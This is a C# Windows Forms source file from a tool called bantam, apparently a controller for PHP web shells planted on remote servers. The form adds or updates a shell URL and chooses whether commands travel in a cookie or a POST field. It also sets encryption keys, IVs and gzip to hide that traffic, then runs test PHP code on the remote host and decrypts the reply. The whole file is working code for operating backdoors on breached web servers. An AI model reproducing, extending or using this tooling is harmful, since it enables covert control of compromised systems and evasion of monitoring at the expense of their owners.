using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Windows.Forms;

using bantam.Classes;

namespace bantam.Forms
{
    public partial class ModifyShell : Form
    {
        /// <summary>
        /// 
        /// </summary>
        private static string g_CallingShellUrl = string.Empty;

        /// <summary>
        /// 
        /// </summary>
        private static readonly ReadOnlyCollection<string> requestTypes = new List<string> {
            "cookie",
            "post",
        }.AsReadOnly();

        /// <summary>
        /// 
        /// </summary>
        private static readonly ReadOnlyCollection<string> ResponseEncryptionModes = new List<string> {
             "openssl",
             "mcrypt",
        }.AsReadOnly();

        /// <summary>
        /// Add shell constructor
        /// </summary>
        public ModifyShell()
        {
            InitializeComponent();

            foreach(var item in requestTypes) {
                comboBoxVarType.Items.Add(item);
            }

            foreach(var item in ResponseEncryptionModes) {
                comboBoxEncryptionMode.Items.Add(item);
            }

            comboBoxVarType.SelectedIndex = 0;
            comboBoxEncryptionMode.SelectedIndex = 0;
            labelDynAddHostsStatus.Text = "";
        }

        /// <summary>
        /// Update / Edit Shell Constructor
        /// </summary>
        /// <param name="shellUrl"></param>
        /// <param name="varName"></param>
        /// <param name="varType"></param>
        public ModifyShell(string shellUrl, string varName, string varType)
        {
            InitializeComponent();

            Text = "Update Shell";

            foreach (var item in requestTypes) {
                comboBoxVarType.Items.Add(item);
            }

            foreach (var item in ResponseEncryptionModes) {
                comboBoxEncryptionMode.Items.Add(item);
            }

            g_CallingShellUrl = shellUrl;
            txtBoxShellUrl.Text = shellUrl;

            txtBoxArgName.Text = varName;

            if (BantamMain.Shells.ContainsKey(shellUrl)) {
                checkBoxGZipRequest.Checked = BantamMain.Shells[shellUrl].GzipRequestData;
                checkBoxResponseEncryption.Checked = BantamMain.Shells[shellUrl].ResponseEncryption;
                comboBoxEncryptionMode.SelectedIndex = BantamMain.Shells[shellUrl].ResponseEncryptionMode;

                checkBoxEncryptRequest.Checked = BantamMain.Shells[shellUrl].RequestEncryption;
                if (checkBoxEncryptRequest.Checked) {
                    checkBoxSendIVInRequest.Checked = (string.IsNullOrEmpty(BantamMain.Shells[shellUrl].RequestEncryptionIV)) ? true : false;
                    textBoxEncrpytionIV.Text = BantamMain.Shells[shellUrl].RequestEncryptionIV;
                    textBoxEncrpytionKey.Text = BantamMain.Shells[shellUrl].RequestEncryptionKey;
                    textBoxIVVarName.Text = BantamMain.Shells[shellUrl].RequestEncryptionIVRequestVarName;
                }
            }

            if (requestTypes.Contains(varType)) {
                comboBoxVarType.SelectedIndex = requestTypes.IndexOf(varType);
            } else {
                comboBoxVarType.SelectedIndex = 0;
            }

            btnAddShell.Visible = false;
            btnUpdateShell.Visible = true;
            labelDynAddHostsStatus.Text = "";
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnAddShell_Click(object sender, EventArgs e)
        {
            string shellURL = txtBoxShellUrl.Text;

            if (string.IsNullOrEmpty(shellURL)) {
                return;
            }

            if (checkBoxEncryptRequest.Checked) {
                string encryptionKey = textBoxEncrpytionKey.Text;

                if (encryptionKey.Length != 32) {
                    labelDynAddHostsStatus.Text = "Encryption key length must be 32 charectors... Try again.";
                    return;
                }

                if (!checkBoxSendIVInRequest.Checked) {
                    string encryptionIV = textBoxEncrpytionIV.Text;

                    if (string.IsNullOrEmpty(encryptionIV) || encryptionIV.Length != 16) {
                        labelDynAddHostsStatus.Text = "Encryption IV length must be 16 charectors... Try again.";
                        return;
                    }
                }
            }

            //Remove Shell
            if (BantamMain.Shells.ContainsKey(shellURL)) {
                BantamMain.Instance.GuiCallbackRemoveShellURL(shellURL);

                if (!BantamMain.Shells.TryRemove(shellURL, out ShellInfo shellInfoOut)) {
                    LogHelper.AddGlobalLog("Unable to remove (" + shellURL + ") from shells", "AddShell failure", LogHelper.LOG_LEVEL.ERROR);
                    return;
                }
            }

            //Add Shell
            if (!BantamMain.Shells.TryAdd(shellURL, new ShellInfo())) {
                LogHelper.AddGlobalLog("Unable to add (" + shellURL + ") to shells", "AddShell failure", LogHelper.LOG_LEVEL.ERROR);
                return;
            }

            BantamMain.Shells[shellURL].RequestArgName = txtBoxArgName.Text;

            if (comboBoxVarType.Text == "cookie") {
                BantamMain.Shells[shellURL].SendDataViaCookie = true;
            }

            if (checkBoxResponseEncryption.Checked == false) {
                BantamMain.Shells[shellURL].ResponseEncryption = false;
            } else {
                BantamMain.Shells[shellURL].ResponseEncryption = true;
                BantamMain.Shells[shellURL].ResponseEncryptionMode = comboBoxEncryptionMode.SelectedIndex;
            }

            if (checkBoxGZipRequest.Checked) {
                BantamMain.Shells[shellURL].GzipRequestData = true;
            } else {
                BantamMain.Shells[shellURL].GzipRequestData = false;
            }

            bool encryptResponse = BantamMain.Shells[shellURL].ResponseEncryption;
            int ResponseEncryptionMode = BantamMain.Shells[shellURL].ResponseEncryptionMode;

            if (checkBoxEncryptRequest.Checked) {
                BantamMain.Shells[shellURL].RequestEncryption = true;
                BantamMain.Shells[shellURL].RequestEncryptionKey = textBoxEncrpytionKey.Text;

                if (checkBoxSendIVInRequest.Checked) {
                    BantamMain.Shells[shellURL].SendRequestEncryptionIV = true;
                    BantamMain.Shells[shellURL].RequestEncryptionIV = string.Empty;
                    BantamMain.Shells[shellURL].RequestEncryptionIVRequestVarName = textBoxIVVarName.Text;
                } else {
                    BantamMain.Shells[shellURL].RequestEncryptionIV = textBoxEncrpytionIV.Text;
                    BantamMain.Shells[shellURL].RequestEncryptionIVRequestVarName = string.Empty;
                }
            } else {
                BantamMain.Shells[shellURL].RequestEncryption = false;
                BantamMain.Shells[shellURL].RequestEncryptionIVRequestVarName = string.Empty;
                BantamMain.Shells[shellURL].RequestEncryptionIV = string.Empty;
                BantamMain.Shells[shellURL].RequestEncryptionKey = string.Empty;
            }

            string phpCode = PhpBuilder.PhpTestExecutionWithEcho1(encryptResponse);
            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellURL, phpCode);

            if (string.IsNullOrEmpty(response.Result)) {
                labelDynAddHostsStatus.Text = "Unable to connect, check your settings and try again.";
                return;
            }

            string result = response.Result;

            if (encryptResponse) {
                result = CryptoHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, ResponseEncryptionMode);
            }

            if (string.IsNullOrEmpty(result)) {
                labelDynAddHostsStatus.Text = "Unable to connect, check your settings and try again.";
                return;
            }

            BantamMain.Instance.InitializeShellData(shellURL);

            this.Close();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnUpdateShell_Click(object sender, EventArgs e)
        {
            btnAddShell_Click(sender, e);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void checkBoxResponseEncryption_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBoxResponseEncryption.Checked) {
                comboBoxEncryptionMode.Enabled = true;
            } else {
                comboBoxEncryptionMode.Enabled = false;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void buttonRandomIV_Click(object sender, EventArgs e)
        {
            textBoxEncrpytionIV.Text = CryptoHelper.GetRandomEncryptionIV();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void buttonRandomKey_Click(object sender, EventArgs e)
        {
            textBoxEncrpytionKey.Text = CryptoHelper.GetRandomEncryptionKey();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void checkBoxSendIVInRequest_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBoxSendIVInRequest.Checked) {
                textBoxEncrpytionIV.Enabled = false;
                textBoxIVVarName.Enabled = true;
            } else {
                textBoxEncrpytionIV.Enabled = true;
                textBoxIVVarName.Enabled = false;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void checkBoxEncryptRequest_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBoxEncryptRequest.Checked) {
                textBoxEncrpytionIV.Enabled = true;
                textBoxEncrpytionKey.Enabled = true;
                checkBoxSendIVInRequest.Enabled = true;
                buttonRandomIV.Enabled = true;
                buttonRandomKey.Enabled = true;
            } else {
                textBoxEncrpytionIV.Enabled = false;
                textBoxEncrpytionKey.Enabled = false;
                textBoxIVVarName.Enabled = false;
                buttonRandomIV.Enabled = false;
                checkBoxSendIVInRequest.Enabled = false;
                buttonRandomKey.Enabled = false;
            }
        }
    }
}
